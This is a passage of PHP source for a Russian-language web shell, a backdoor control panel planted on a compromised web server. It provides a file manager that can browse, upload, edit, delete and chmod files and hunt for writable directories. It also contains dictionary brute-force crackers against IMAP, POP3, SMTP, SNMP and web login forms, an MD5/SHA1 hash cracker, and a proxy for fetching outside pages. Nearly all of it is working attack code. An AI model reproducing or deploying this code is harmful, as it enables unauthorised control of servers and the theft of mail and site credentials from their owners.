echo "<tr><td>Инфо о клиенте:</td></tr><tr><td width=\"25%\">IP:</td><td>".$uip."</td></tr><tr><td width=\"25%\">Agent:</td><td>".htmlspecialchars(getenv('HTTP_USER_AGENT'))."</td></tr></table>";

}

function checksum($file){

global $et;

echo "<table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"100%\"><tr><td width=\"10%\"><b>MD5:</b> <font color=#F0F0F0>".md5_file($file)."</font><br><b>SHA1:</b> <font color=#F0F0F0>".sha1_file($file)."</font>".$et;

}

function imaplogin($host,$username,$password){

$sock=fsockopen($host,143,$n,$s,5);

$b=name();

$l=strlen($b);

if(!$sock) { return -1; }

$res=fgets($sock,512);

fputs($sock,$b." LOGIN $username $password\r\n");

$res=fgets($sock,$l+4);

if ($res == $b." OK") { return 1; } else { return 0; }

fclose($sock);

}

function pop3login($server,$user,$pass){

$sock=fsockopen($server,110,$en,$es,5);

if(!$sock) { return -1; }

$r=fgets($sock);

fwrite($sock,"user ".$user."\n");

$r=fgets($sock);

if($r{0}=='-') { return 0; }

fwrite($sock,"pass ".$pass."\n");

$r=fgets($sock);

fclose($sock);

if($r{0}=='+') { return 1; }

return 0;

}

function tumb($src) {

$width=19;

$height=16;

$rgb=0xFFFFFF;

if (!file_exists($src)) return false;

$size = getimagesize($src);

if ($size == false) return false;

$format = strtolower(substr($size['mime'], strpos($size['mime'], '/')+1));

$icfunc = "imagecreatefrom" . $format;

if (!function_exists($icfunc)) return false;

$x_ratio = $width / $size[0];

$y_ratio = $height / $size[1];

$ratio       = min($x_ratio, $y_ratio);

$use_x_ratio = ($x_ratio == $ratio);

$new_width   = $use_x_ratio  ? $width  : floor($size[0] * $ratio);

$new_height  = !$use_x_ratio ? $height : floor($size[1] * $ratio);

$new_left    = $use_x_ratio  ? 0 : floor(($width - $new_width) / 2);

$new_top     = !$use_x_ratio ? 0 : floor(($height - $new_height) / 2);

$isrc = $icfunc($src);

$idest = imagecreatetruecolor($width, $height);

imagefill($idest, 0, 0, $rgb);

imagecopyresampled($idest, $isrc, $new_left, $new_top, 0, 0, $new_width, $new_height, $size[0], $size[1]);

ob_start();

imagejpeg($idest);

$cont=ob_get_contents();

ob_end_clean();

imagedestroy($isrc);

imagedestroy($idest);

return $cont;

}

if (isset($_REQUEST['tumb'])) {

header("Content-type: image/gif");

die(tumb($_REQUEST['t']));

}

function tumbnail($f) {

$ret="<img src=\"".hlink("tumb=1&t=".$f)."\">  ";

return $ret;

}

function listdir($cwd,$task){

$c= getcwd();

$dh = opendir($cwd);

while ($cont=readdir($dh)){

if($cont=='.' || $cont=='..')continue;

$adr = $cwd.DIRECTORY_SEPARATOR.$cont;

switch ($task){

case '0':if(is_file($adr))echo "[<a href=\"".hlink("sec=edit&file=$adr&workingdir=$c")."\">$adr</a>]\n";if(is_dir($adr))echo "[<a href=\"".hlink("sec=fm&workingdir=$adr")."\">$adr</a>]\n";break;

case '1':if(is_writeable($adr))if(is_file($adr))echo "[<a href=\"".hlink("sec=edit&file=$adr&workingdir=$c")."\">$adr</a>]\n";if(is_dir($adr))echo "[<a href=\"".hlink("sec=fm&workingdir=$adr")."\">$adr</a>]\n";break;

case '2':if(is_file($adr) &&  is_writeable($adr))echo "[<a href=\"".hlink("sec=edit&file=$adr&workingdir=$c")."\">$adr</a>]\n";break;

case '3':if(is_dir($adr) && is_writeable($adr))echo "[<a href=\"".hlink("sec=fm&workingdir=$adr")."\">$adr</a>]\n";break;

case '4':if(is_file($adr))echo "[<a href=\"".hlink("sec=edit&file=$adr&workingdir=$c")."\">$adr</a>]\n";break;

case '5':if(is_dir($adr))echo "[<a href=\"".hlink("sec=fm&workingdir=$adr")."\">$adr</a>]\n";break;

case '6':if(preg_match("@".$_REQUEST['search']."@",$cont)){if(is_file($adr))echo "[<a href=\"".hlink("sec=edit&file=$adr&workingdir=$c")."\">$adr</a>]\n";if(is_dir($adr))echo "[<a href=\"".hlink("sec=fm&workingdir=$adr")."\">$adr</a>]\n";}break;

case '7':if(strstr($cont,$_REQUEST['search'])){if(is_file($adr))echo "[<a href=\"".hlink("sec=edit&file=$adr&workingdir=$c")."\">$adr</a>]\n";if(is_dir($adr))echo "[<a href=\"".hlink("sec=fm&workingdir=$adr")."\">$adr</a>]\n";}break;

}

if (is_dir($adr)) listdir($adr,$_REQUEST['task']);

}

}

if (!function_exists("posix_getpwuid") && !strstr($disablefunctions,'posix_getpwuid')) {function posix_getpwuid($u) {return 0;}}

if (!function_exists("posix_getgrgid") && !strstr($disablefunctions,'posix_getgrgid')) {function posix_getgrgid($g) {return 0;}}

function filemanager(){

global $windows,$msgbox,$errorbox,$t,$et,$hcwd;

$cwd= getcwd();

$table = "<table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" width=\"100%\">";

$td1n="<td width=\"22%\" bgcolor=\"#666666\">";

$td2m="<td width=\"22%\" bgcolor=\"#808080\">";

$td1i="<td width=\"5%\" bgcolor=\"#666666\">";

$td2i="<td width=\"5%\" bgcolor=\"#808080\">";

$tdnr="<td width=\"22%\" bgcolor=\"#800000\">";

$tdw="<td width=\"22%\" bgcolor=\"#006E00\">";

if (!empty($_REQUEST['task'])){

if (!empty($_REQUEST['search'])) $_REQUEST['task'] = 7;

if (!empty($_REQUEST['re'])) $_REQUEST['task'] = 6;

echo "<font color=blue><pre>";

listdir($cwd,$_REQUEST['task']);

echo "</pre></font>";

}else{

if (!empty($_REQUEST['cp']) || !empty($_REQUEST['mv'])|| !empty($_REQUEST['rn'])){

if (!empty($_REQUEST['cp']) || !empty($_REQUEST['mv'])){

$title="Destination";

$ad = (!empty($_REQUEST['cp']))?$_REQUEST['cp']:$_REQUEST['mv'];

$dis =(!empty($_REQUEST['cp']))?'Копировать':'Переместить';

}else{

$ad = $_REQUEST['rn'];

$title ="Новое имя";

$dis = "Переименовать";

}

if (!!empty($_REQUEST['des'])){

echo "<center><table border=0 style=\"border-collapse: collapse\" width=\"40%\"><tr><td width=\"100%\">$title:</td></tr><tr>$td1n<form method=\"POST\"><input type=hidden name=workingdir size=135 value=\"".getcwd()."\"><input type=text value=\"";if(empty($_REQUEST['rn'])) echo $cwd; echo "\" size=60 name=des></td></tr><tr>$td2m$hcwd<input type=hidden value=\"".htmlspecialchars($ad)."\" name=cp><input class=buttons type=submit value=$dis></td></tr></form></table></center>";

}else{

if (!empty($_REQUEST['rn'])) rename($ad,$_REQUEST['des']);

else{

copy($ad,$_REQUEST['des']);

if (!empty($_REQUEST['mv']))unlink($ad);

}

}

}

if (!empty($_REQUEST['del'])) {

function dir_delete($df) {

if ($dir=opendir($df)) {

$i=0;

while (($file=readdir($dir))!=false) {

if ($file=="." or $file=="..") continue;

if (is_dir("$df/$file"))  {

dir_delete($df."/".$file);

} 

else {

unlink($df."/".$file);

}

$i++;

}

}

closedir($dir);

rmdir("$df/$file");

}

if (is_dir($_REQUEST['del'])) { dir_delete($_REQUEST['del']); }

else { unlink ($_REQUEST['del']); }

}

if (!empty($_FILES['uploadfile'])){

if (!file_exists($_FILES['uploadfile']['name'])) {

copy($_FILES['uploadfile']['tmp_name'],$_FILES['uploadfile']['name']);

echo "$msgbox<b>Загружен!</b> Имя: ".$_FILES['uploadfile']['name']." Размер: ".$_FILES['uploadfile']['size']. "$et<br>"; }

else { echo "$msgbox<b>Такой файл уже есть!</b> Имя: ".$_FILES['uploadfile']['name']." Размер: ".$_FILES['uploadfile']['size']. "$et<br>"; }

}

$select = "<select onChange=\"window.location=this.options[this.selectedIndex].value;\"><option value=\"".hlink("sec=fm&workingdir=$cwd")."\">--------</option><option value=\"";

if (!empty($_REQUEST['newf'])){

if (!empty($_REQUEST['newfile'])){ if (!file_exists($_REQUEST['newf'])) { fclose(fopen($_REQUEST['newf'],"w+")); }}

if (!empty($_REQUEST['newdir'])){mkdir($_REQUEST['newf']);}

}

if ($windows){

echo "$table<td><b>Диски:</b> ";

for ($i=66;$i<=90;$i++){$drive= chr($i).':';

if (is_dir($drive."\\")){$vol=shell("vol $drive");if(empty($vol))$vol=$drive;echo " <a title=\"$vol\" href=".hlink("sec=fm&workingdir=$drive\\").">$drive\\</a>";}

}

echo $et;

}

echo "$table<form method=\"POST\" action=\"".hlink("sec=fm")."\"><tr><td width=\"20%\">&nbsp; <input type=text name=workingdir size=135 value=\"".getcwd()."\"><input class=buttons type=submit value=Изменить></td></tr></form></table>";

$file=array();$dir=array();$link=array();

if($dirhandle = opendir($cwd)){

while ($cont=readdir($dirhandle)){

if (is_dir($cwd.DIRECTORY_SEPARATOR.$cont)) $dir[]= $cont;

elseif (is_file($cwd.DIRECTORY_SEPARATOR.$cont)) $file[]=$cont;

else $link[]=$cont;

}

closedir($dirhandle);

sort($file);sort($dir);sort($link);

echo "<table border=1 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" width=\"100%\"><tr><td width=\"30%\" align=\"center\">Name</td><td width=\"13%\" align=\"center\">User</td><td width=\"12%\" align=\"center\">Time edit</td><td width=\"12%\" align=\"center\">Latest update</td><td width=\"5%\" align=\"center\">Info</td><td width=\"7%\" align=\"center\">Size</td><td width=\"15%\" align=\"center\">Activity</td></tr>";

$i=0;

foreach($dir as $dn){

echo "<tr>";

$i++;

$own = "Неизвестно";

$owner = posix_getpwuid(fileowner($dn));

$mdate = date("Y/m/d H:i:s",filemtime($dn));

$adate = date("Y/m/d H:i:s",fileatime($dn));

$diraction = $select.hlink("sec=fm&workingdir=".realpath($dn))."\">Открыть</option><option value=\"".hlink("sec=fm&workingdir=$cwd&rn=$dn")."\">Переименовать</option><option value=\"".hlink("sec=fm&del=$dn&workingdir=$cwd")."\">Удалить</option></select></td>";

if ($owner) $own = "<a title=\" Shell: ".$owner['shell']."\" href=\"".hlink("sec=fm&workingdir=".$owner['dir'])."\">".$owner['name']."</a>";

if (($i%2)==0){$cl1=$td1i;$cl2=$td1n;}else{$cl1=$td2i;$cl2=$td2m;}

if (is_writeable($dn)) echo $tdw;elseif (!is_readable($dn)) echo $tdnr;else echo $cl2;

echo icon(realpath($dn))."<a href=\"".hlink("sec=fm&workingdir=".realpath($dn))."\">";

if (strlen($dn)>45)echo substr($dn,0,42)."...";else echo $dn;echo "</a>";

echo $cl1."$own</td>";

echo $cl1."$mdate</td>";

echo $cl1."$adate</td>";

echo "</td>${cl1}<a href=\"".hlink("sec=chmod&file=".$dn."&workingdir=".getcwd())."\">*D";if (is_readable($dn)) echo "R";if (is_writeable($dn)) echo "W";echo "*</a></td>";

echo "$cl1------</td>";

echo $cl2.$diraction;

echo "</tr>" ;

flusher();

}

foreach($file as $fn){

echo "<tr>";

$i++;

$own = "Неизвестно";

$owner = posix_getpwuid(fileowner($fn));

$fileaction=$select.hlink("sec=openit&name=$fn&workingdir=$cwd")."\">Открыть</option><option value=\"".hlink("sec=edit&file=$cwd/$fn&workingdir=$cwd")."\">Редактировать</option><option value=\"".hlink("sec=fm&download=$fn&workingdir=$cwd")."\">Скачать</option><option value=\"".hlink("sec=hex&file=$fn&workingdir=$cwd")."\">НЕХ код</option><option value=\"".hlink("sec=img&file=$fn&workingdir=$cwd")."\">Картинка</option><option value=\"".hlink("sec=inc&file=$fn&workingdir=$cwd")."\">Include</option><option value=\"".hlink("sec=checksum&file=$fn&workingdir=$cwd")."\">Контрольная сумма</option><option value=\"".hlink("sec=fm&workingdir=$cwd&cp=$fn")."\">Копировать</option><option value=\"".hlink("sec=fm&workingdir=$cwd&mv=$fn")."\">Переместить</option><option value=\"".hlink("sec=fm&workingdir=$cwd&rn=$fn")."\">Переименовать</option><option value=\"".hlink("sec=fm&del=$fn&workingdir=$cwd")."\">Удалить</option></select></td>";

$mdate = date("Y/m/d H:i:s",filemtime($fn));

$adate = date("Y/m/d H:i:s",fileatime($fn));

if ($owner) $own = "<a title=\"Shell:".$owner['shell']."\" href=\"".hlink("sec=fm&workingdir=".$owner['dir'])."\">".$owner['name']."</a>";

$size = showsize(filesize($fn));

if (($i%2)==0){$cl1=$td1i;$cl2=$td1n;}else{$cl1=$td2i;$cl2=$td2m;}

if (is_writeable($fn)) echo $tdw;elseif (!is_readable($fn)) echo $tdnr;else echo $td2m;

if (get_file_ext($fn) == "gif" || get_file_ext($fn) == "jpg" || get_file_ext($fn) == "png" || get_file_ext($fn) == "jpeg") {

$imagesize=getimagesize(realpath($fn));

echo "<a href=\"".hlink("sec=img&file=$fn&workingdir=$cwd")."\">".icon(realpath($fn)).tumbnail(realpath($fn))."&nbsp;(".$imagesize[0]."x".$imagesize[1].")&nbsp;&nbsp;";

} else {

echo icon(realpath($fn))."<a href=\"".hlink("sec=openit&name=$fn&workingdir=$cwd")."\">";

}

if (strlen($fn)>45)echo substr($fn,0,42)."...";else echo $fn;echo "</a>";

echo $cl1."$own</td>";

echo $cl1."$mdate</td>";

echo $cl1."$adate</td>";

echo "</td>$cl1<a href=\"".hlink("sec=chmod&file=".$fn."&workingdir=".getcwd())."\">*";if (is_readable($fn)) echo "R";if (is_writeable($fn)) echo "W";if (is_executable($fn)) echo "X";if (is_uploaded_file($fn)) echo "U"; echo "*</a></td>";

echo "$cl1$size</td>";

echo $td2m.$fileaction;

echo "</tr>" ;

flusher();

}

foreach($link as $ln){

$own = "Неизвестно";

$i++;

$owner = posix_getpwuid(fileowner($ln));

$linkaction=$select.hlink("sec=openit&name=$ln&workingdir=$ln")."\">Открыть</option><option value=\"".hlink("sec=edit&file=$cwd/$ln&workingdir=$cwd")."\">Редактировать</option><option value=\"".hlink("sec=fm&download=$ln&workingdir=$cwd")."\">Скачать</option><option value=\"".hlink("sec=hex&file=$ln&workingdir=$cwd")."\">НЕХ код</option><option value=\"".hlink("sec=img&file=$ln&workingdir=$cwd")."\">Картинка</option><option value=\"".hlink("sec=inc&file=$ln&workingdir=$cwd")."\">Include</option><option value=\"".hlink("sec=checksum&file=$ln&workingdir=$cwd")."\">Контрольная сумма</option><option value=\"".hlink("sec=fm&workingdir=$cwd&cp=$ln")."\">Копировать</option><option value=\"".hlink("sec=fm&workingdir=$cwd&mv=$ln")."\">Переместить</option><option value=\"".hlink("sec=fm&workingdir=$cwd&rn=$ln")."\">Переименовать</option><option value=\"".hlink("sec=fm&del=$ln&workingdir=$cwd")."\">Удалить</option></select></td>";

$mdate = date("Y/m/d H:i:s",filemtime($ln));

$adate = date("Y/m/d H:i:s",fileatime($ln));

if ($owner) $own = "<a title=\"Shell: ".$owner['shell']."\" href=\"".hlink("sec=fm&workingdir=".$owner['dir'])."\">".$owner['name']."</a>";

echo "<tr>";

$size = showsize(filesize($ln));

if (($i%2)==0){$cl1=$td1i;$cl2=$td1n;}else{$cl1=$td2i;$cl2=$td2m;}

if (is_writeable($ln)) echo $tdw;elseif (!is_readable($ln)) echo $tdnr;else echo $cl2;

echo "<a href=\"".hlink("sec=openit&name=$ln&workingdir=$cwd")."\">";

if (strlen($ln)>45)echo substr($ln,0,42)."...";else echo $ln;echo "</a>";

echo $cl1."$own</td>";

echo $cl1."$mdate</td>";

echo $cl1."$adate</td>";

echo "</td>${cl1}L";if (is_readable($ln)) echo "R";if (is_writeable($ln)) echo "W";if (is_executable($ln)) echo "X"; echo "</td>";

echo "$cl1$size</td>";

echo $cl2.$linkaction;

echo "</tr>" ;

flusher();

}

}

$dc = count($dir)-2;

if($dc==-2)$dc=0;

$fc = count($file);

$lc = count($link);

$total = $dc + $fc + $lc;

echo "$table<tr><td><form method=POST action=\"".hlink("sec=fm")."\">Найти:<input type=text name=search><input type=checkbox name=re value=1 style=\"border-width:1px;background-color:#333333;\" checked>Регулярные выражения <input type=submit class=buttons value=Найти>$hcwd<input type=hidden value=7 name=task></form></td><td><form method=POST action=\"".hlink("sec=fm")."\">$hcwd<select name=task><option value=0>Показать все файлы и папки в данной папке</option><option value=1>Найти папки доступные для записи</option><option value=2>Найти файлы доступные для записи</option><option value=3>Найти папки доступные для записи в текущей папке</option><option value=4>Показать все файлы в текущей папке</option><option value=5>Показать все папки в текущей папке</option></select><input type=submit class=buttons value=\"&gt;&gt;\"></form>$et</tr></table><table width=\"100%\"><tr><td width=\"50%\"><br><table bgcolor=#333333 border=0 width=\"65%\"><td><b>Суммарно:</b>   Всего: $total Папок: $dc Файлов: $fc Ссылок: $lc</td></table><table border=0 width=\"65%\"><td width=\"100%\" bgcolor=";if (is_writeable($cwd)) echo "#006E00";elseif (!is_readable($cwd)) echo "#800000";else "#333333"; echo ">Статус текущей папки: "; if (is_readable($cwd)) echo "R";if (is_writeable($cwd)) echo "W" ;echo "</td></table><table border=0 style=\"border-collapse: collapse\" width=\"65%\"><tr><td width=\"100%\">Создать:</td></tr><tr>$td1n<form method=\"POST\" action=\"".hlink("sec=fm")."\"><input type=text size=47 name=newf></td></tr><tr>$td2m$hcwd<input class=buttons type=submit name=newfile value=\"Файл\"><input class=buttons type=submit name=newdir value=\"Папку\"></td></tr></form></table></td><td width=\"50%\"><br>${t}Загрузить:</td></tr><tr>$td1n<form method=\"POST\" enctype=\"multipart/form-data\" action=\"".hlink("sec=fm")."\"><input type=file size=45 name=uploadfile></td></tr><tr>$td2m$hcwd<input class=buttons type=submit value=Загрузить></td></tr>$td1n Maximum - ".ini_get('upload_max_filesize')."</td></tr></form></table>$et";

}

}

function cm() {

global $windows,$msgbox,$errorbox,$et;

if (!$windows) {

$mode=substr(sprintf('%o', fileperms($_REQUEST['file'])), -4);

echo $msgbox;

if (!empty($_POST['set'])) {

$mode = 0;

if (!empty($_POST['ur'])) $mode |= 0400; if (!empty($_POST['uw'])) $mode |= 0200; if (!empty($_POST['ux'])) $mode |= 0100;

if (!empty($_POST['gr'])) $mode |= 0040; if (!empty($_POST['gw'])) $mode |= 0020; if (!empty($_POST['gx'])) $mode |= 0010;

if (!empty($_POST['or'])) $mode |= 0004; if (!empty($_POST['ow'])) $mode |= 0002; if (!empty($_POST['ox'])) $mode |= 0001;

if (chmod($_REQUEST['file'], $mode)) {

echo "OK!<script>location.href=\"".str_replace("\\","\\\\",hlink("sec=fm&workingdir=".getcwd()))."\";</script>";

} else {

echo "ERROR!";

}

} else {

$mode = fileperms($_REQUEST['file']);

echo '<form action="'.hlink("sec=chmod&file=".$_REQUEST['file']."&workingdir=".getcwd()).'" method="post">

<table>

<tr>

<td>

<p style="margin: 0">CHMOD ' . realpath($_REQUEST['file']) . '</p>

<hr />

<table>

<tr>

<td></td>

<td style="border-right: 1px solid black">Owner</td>

<td style="border-right: 1px solid black">Group</td>

<td>Other</td>

</tr>

<tr>

<td style="text-align: right">Чтение:</td>

<td><input type="checkbox" name="ur" value="1"'; if ($mode & 00400) echo ' checked="checked"'; echo ' /></td>

<td><input type="checkbox" name="gr" value="1"'; if ($mode & 00040) echo ' checked="checked"'; echo ' /></td>

<td><input type="checkbox" name="or" value="1"'; if ($mode & 00004) echo ' checked="checked"'; echo ' /></td>

</tr>

<tr>

<td style="text-align: right">Запись:</td>

<td><input type="checkbox" name="uw" value="1"'; if ($mode & 00200) echo ' checked="checked"'; echo ' /></td>

<td><input type="checkbox" name="gw" value="1"'; if ($mode & 00020) echo ' checked="checked"'; echo ' /></td>

<td><input type="checkbox" name="ow" value="1"'; if ($mode & 00002) echo ' checked="checked"'; echo ' /></td>

</tr>

<tr>

<td style="text-align: right">Выполнение:</td>

<td><input type="checkbox" name="ux" value="1"'; if ($mode & 00100) echo ' checked="checked"'; echo ' /></td>

<td><input type="checkbox" name="gx" value="1"'; if ($mode & 00010) echo ' checked="checked"'; echo ' /></td>

<td><input type="checkbox" name="ox" value="1"'; if ($mode & 00001) echo ' checked="checked"'; echo ' /></td>

</tr>

</table>

<hr />

<input type="submit" name="set" value="Задать" />

</td>

</tr>

</table>

</form>';

}

echo $et;

} else {

echo $errorbox."Извините, CHMOD недоступен под Windows!".$et;

}

}

function imapcracker(){

global $t,$et,$errorbox,$crack;

if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){

$target=$_REQUEST['target'];

$type=$_REQUEST['combo'];

$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";

$dictionary=fopen($_REQUEST['dictionary'],'r');

if ($dictionary){

echo "<font color=blue>Ломаем ".htmlspecialchars($target)."...<br>";

while(!feof($dictionary)){

if($type){

$combo=trim(fgets($dictionary)," \n\r");

$user=substr($combo,0,strpos($combo,':'));

$pass=substr($combo,strpos($combo,':')+1);

}else{

$pass=trim(fgets($dictionary)," \n\r");

}

$pop3=imaplogin($target,$user,$pass);

if($pop3==-1){echo $errorbox." Нет связи с сервером.".$et; break;

}else{

if ($pop3){echo "U: ".$user." P: ".$pass."<br>"; if(!$type) { break; }}}

flusher();

}

echo "<br>Готово!</font>";

fclose($dictionary);

}

else{

echo $errorbox." Невозможно открыть словарь.".$et;

}}

else { echo "<center>${t}IMAP брут:$crack"; }

}

function snmpcracker(){

global $t,$et,$errorbox,$crack,$hcwd;

if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){

$target=$_REQUEST['target'];

$dictionary=fopen($_REQUEST['dictionary'],'r');

if ($dictionary){

echo "<font color=blue>Ломаем ".htmlspecialchars($target)."...<br>";

while(!feof($dictionary)){

$com=trim(fgets($dictionary)," \n\r");

$res=snmpcheck($target,$com);

if ($res!="") { echo $com."<br>"; }

flusher();

}

echo "<br>Готово</font>";

fclose($dictionary);

}

else{

echo $errorbox." Невозможно открыть словарь.".$et;

}

}else{

echo "<center>${t}SNMP брут:</td><td></td></tr><form method=\"POST\">".$hcwd."<tr><td width=\"20%\">Словарь:</td><td><input type=text name=dictionary size=35></td></tr><tr><td width=\"20%\">Сервер:</td><td><input type=text name=target size=35></td></tr><tr><td width=\"20%\"></td><td align=right><input class=buttons type=submit value=Старт></td></tr></form></table></center>";

}}

function pop3cracker(){

global $t,$et,$errorbox,$crack;

if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){

$target=$_REQUEST['target'];

$type=$_REQUEST['combo'];

$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";

$dictionary=fopen($_REQUEST['dictionary'],'r');

if ($dictionary){

echo "<font color=blue>Ломаем ".htmlspecialchars($target)."...<br>";

while(!feof($dictionary)){

if($type){

$combo=trim(fgets($dictionary)," \n\r");

$user=substr($combo,0,strpos($combo,':'));

$pass=substr($combo,strpos($combo,':')+1);

}else{

$pass=trim(fgets($dictionary)," \n\r");

}

$pop3=pop3login($target,$user,$pass);

if($pop3==-1){echo "$errorbox Нет связи с сервером.$et";break;} else{

if ($pop3){echo "U: ".$user." P: ".$pass."<br>"; if(!$type) {break; }}}

flusher();

}

echo "<br>Готово!</font>";

fclose($dictionary);

}else{

echo $errorbox." Невозможно открыть словарь.".$et;

}

}else { echo "<center>${t}POP3 брут:$crack"; }

}

function smtpcracker(){

global $t,$et,$errorbox,$crack;

if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){

$target=$_REQUEST['target'];

$type=$_REQUEST['combo'];

$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";

$dictionary=fopen($_REQUEST['dictionary'],'r');

if ($dictionary){

echo "<font color=blue>Ломаем ".htmlspecialchars($target)."...<br>";

while(!feof($dictionary)){

if($type){

$combo=trim(fgets($dictionary)," \n\r");

$user=substr($combo,0,strpos($combo,':'));

$pass=substr($combo,strpos($combo,':')+1);

}else{

$pass=trim(fgets($dictionary)," \n\r");

}

$pop3=smtplogin($target,$user,$pass,5);

if($pop3==-1){echo $errorbox." Нет связи с сервером.".$et; break; }else{

if ($pop3) { echo "U: ".$user." P: ".$pass."<br>"; if(!$type) { break; }}}

flusher();

}

echo "<br>Готово!</font>";

fclose($dictionary);

}else{

echo $errorbox." Невозможно открыть словарь.".$et;

}

}else echo "<center>${t}SMTP брут:$crack";

}

function formcracker(){

global $errorbox,$footer,$et,$hcwd;

$method='POST';

if(!empty($_REQUEST['start'])){

$url=$_REQUEST['target'];

$uf=$_REQUEST['userf'];

$pf=$_REQUEST['passf'];

$sf=$_REQUEST['submitf'];

$sv=$_REQUEST['submitv'];

$method=$_REQUEST['method'];

$fail=$_REQUEST['fail'];

$dic=$_REQUEST['dictionary'];

$type=$_REQUEST['combo'];

$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";

if(!file_exists($dic)) { die($errorbox." Невозможно открыть словарь.".$et.$footer); }

$dictionary=fopen($dic,'r');

$u=parse_url($url);

$host=$u['host'];$page=(!empty($u['path']))?$u['path']:'/';

echo "<font color=blue>Брут начался...<br>";

while(!feof($dictionary)){

if($type){

$combo=trim(fgets($dictionary)," \n\r");

$user=substr($combo,0,strpos($combo,':'));

$pass=substr($combo,strpos($combo,':')+1);

}else{

$pass=trim(fgets($dictionary)," \n\r");

}

$line="";

$data=$uf."=".$user."&".$pf."=".$pass."&".$sf."=".$sv;

$http=fsockopen($host,80,$errno,$errstr,12);

if (!$http) { continue; }

if ($method=="POST"){

fputs($http,"POST $page HTTP/1.0\r\nHost: $host\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-length: ".strlen( $data )."\r\nAccept-Encoding: text\r\nConnection: close\r\n\r\n$data");

}else{

fputs($http,"GET $page?$data HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\n\r\n");

}

while(!feof($http)){

$line.=fgets($http,32);

}

if (!strstr($line,$fail)){echo "<font color=blue>U: $user P: $pass</font><br>";if(!$type)break;}

fclose($http);

flusher();

}

fclose($dictionary);

echo "Готово!</font><br>";

}

else echo "<center><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"434\"><tr><td width=\"174\">Брут форм:</td><td width=\"253\"></td></tr><form method=\"POST\" name=form><tr><td width=\"174\">Словарь:</td><td width=\"253\"><input type=text name=dictionary size=35></td></tr><tr><td width=\"174\">Тип словаря:</td><td><input type=radio name=combo checked value=0 onClick=\"document.form.user.disabled = false;\" style=\"border-width:1px;\">Simple (P)<input type=radio value=1 name=combo onClick=\"document.form.user.disabled = true;\" style=\"border-width:1px;\">Combo (U:P)</td></tr><tr><td width=\"174\">Имя:</td><td><input type=text size=35 value=root name=user>$hcwd</td></tr><tr><td width=\"174\">Страница:</td><td width=\"253\"><input type=text name=target value=\"http://".getenv('HTTP_HOST')."/login.php\" size=35></td></tr><tr><td width=\"174\">Метод:</td><td width=\"253\"><select size=\"1\" name=\"method\"><option selected value=\"POST\">POST</option><option value=\"GET\">GET</option></select></td></tr><tr><td width=\"174\">Поле для логина:</td><td width=\"253\"><input type=text name=userf value=user size=35></td></tr><tr><td width=\"174\">Поле для пароля:</td><td width=\"253\"><input type=text name=passf value=passwd size=35></td></tr><tr><td width=\"174\">Submit name:</td><td width=\"253\"><input type=text value=login name=submitf size=35></td></tr><tr><td width=\"174\">Submit value:</td><td width=\"253\"><input type=text value=\"Login\" name=submitv size=35></td></tr><tr><td width=\"174\">Текст ошибки:</td><td width=\"253\"><input type=text name=fail value=\"Try again\" size=35></td></tr><tr><td width=\"174\"></td><td align=right width=\"253\"><input class=buttons type=submit name=start value=Старт></td></tr></form></table></center>";

}

function hashcracker(){

global $errorbox,$t,$et,$hcwd;

if (!empty($_REQUEST['hash']) && !empty($_REQUEST['dictionary']) && !empty($_REQUEST['type'])){

$dictionary=fopen($_REQUEST['dictionary'],'r');

if ($dictionary){

$hash=strtoupper($_REQUEST['hash']);

echo "<font color=blue>Ломаем " . htmlspecialchars($hash)."...<br>";

$type=($_REQUEST['type']=='MD5')?'md5':'sha1';

while(!feof($dictionary)){

$word=trim(fgets($dictionary)," \n\r");

if ($hash==strtoupper(($type($word)))){echo "Ответ: ".htmlspecialchars($word)."<br>";break;}

}

echo "Готово!</font>";

fclose($dictionary);

}

else{

echo "$errorbox Невозможно открыть словарь.$et";

}

}

echo "<center>${t}Hash брут:</td><td></td></tr><form method=\"POST\"><tr><td width=\"20%\">Словарь:</td><td><input type=text name=dictionary size=35></td></tr><tr><td width=\"20%\">Hash:</td><td><input type=text name=hash size=35></td></tr><tr><td width=\"20%\">Тип:</td><td><select name=type><option selected value=MD5>MD5</option><option value=SHA1>SHA1</option></select></td></tr><tr><td width=\"20%\"></td><td align=right>$hcwd<input class=buttons type=submit value=Старт></td></tr></form></table></center>";

}

function proxy(){

global $errorbox,$et,$footer,$hcwd;

echo "<table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"100%\"><form method=\"POST\"><tr><td width=\"20%\"><b>Адрес: </b><input type=text name=url size=140 value=\"";

if(!!empty($_REQUEST['url'])) { echo "http://2ip.ru/"; }

else { echo htmlspecialchars($_REQUEST['url']); }

echo "\">$hcwd<input type=submit class=buttons value=\"&gt;&gt;\"></td></tr></form></table>";

if (!empty($_REQUEST['url'])){

$dir="";

$u=parse_url($_REQUEST['url']);

$host=$u['host'];$file==(!empty($u['path']))?$u['path']:'/';

if(substr_count($file,'/')>1)$dir=substr($file,0,(strpos($file,'/')));

$url=@fsockopen($host, 80, $errno, $errstr, 12);

if(!$url)die("<br>$errorbox Нет связи!$et$footer");

fputs($url, "GET /$file HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)\r\n\r\n");

while(!feof($url)){

$con = fgets($url);

$con = str_replace("href=mailto","HrEf=mailto",$con);

$con = str_replace("HREF=mailto","HrEf=mailto",$con);

$con = str_replace("href=\"mailto","HrEf=\"mailto",$con);

$con = str_replace("HREF=\"mailto","HrEf=\"mailto",$con);

$con = str_replace("href=\'mailto","HrEf=\"mailto",$con);

$con = str_replace("HREF=\'mailto","HrEf=\"mailto",$con);

$con = str_replace("href=\"http","HrEf=\"".hlink("sec=px&url=http"),$con);

$con = str_replace("HREF=\"http","HrEf=\"".hlink("sec=px&url=http"),$con);

